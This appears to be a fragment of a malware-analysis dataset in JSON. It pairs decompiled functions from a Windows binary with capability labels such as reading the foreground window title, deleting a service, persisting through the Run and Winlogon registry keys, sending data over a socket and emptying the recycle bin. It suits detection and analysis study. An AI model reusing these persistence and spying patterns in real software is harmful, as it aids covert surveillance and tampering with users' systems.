        "decompiled_code": "\nvoid fcn.0048d788(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48d7f5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c28();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48d7fc);\n    return;\n}\n",
        "token_count": 271
    },
    "0048e840": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048e840(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48e8ad;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c28();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48e8b4);\n    return;\n}\n",
        "token_count": 271
    },
    "004716cc": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nvoid fcn.004716cc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY68;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4716de;\n    fcn.004059cc();\n    uStack28 = 0x47174b;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        uVar2 = fcn.004059dc(0x10000);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            sub.advapi32.dll_DeleteService(iVar3);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY68 = iVar1;\n    }\n    *in_FS_OFFSET = iStackY68;\n    fcn.00405530(0x471752);\n    return;\n}\n",
        "token_count": 302
    },
    "0048df24": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048df24(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x90);\n    fcn.0040aab0();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 73
    },
    "0048df54": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048df54(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x90);\n    fcn.0040aab0();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 73
    },
    "00470dac": {
        "rules": [
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.00470dac(void)\n\n{\n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00422014();\n    return;\n}\n",
        "token_count": 48
    },
    "0047f790": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047f790(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "00480b30": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480b30(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 70
    },
    "00483864": {
        "rules": [
            "persist via Winlogon Helper DLL registry key"
        ],
        "decompiled_code": "\nvoid fcn.00483864(void)\n\n{\n    uint32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x483927;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00422014();\n    arg_ch = *0x483988;\n    arg_8h = &var_8h;\n    fcn.0040f23c();\n    fcn.00405864();\n    fcn.0040ef4c(arg_8h, arg_ch);\n    fcn.004055c8();\n    fcn.00421fb4();\n    fcn.00404650();\n    *in_FS_OFFSET = arg_8h;\n    iStack36 = 0x48392e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 296
    },
    "0048acbc": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\nvoid fcn.0048acbc(void)\n\n{\n    sub.SHELL32.DLL_SHEmptyRecycleBinA(0, 0x48accc, 1);\n    return;\n}\n",
        "token_count": 44
    }
}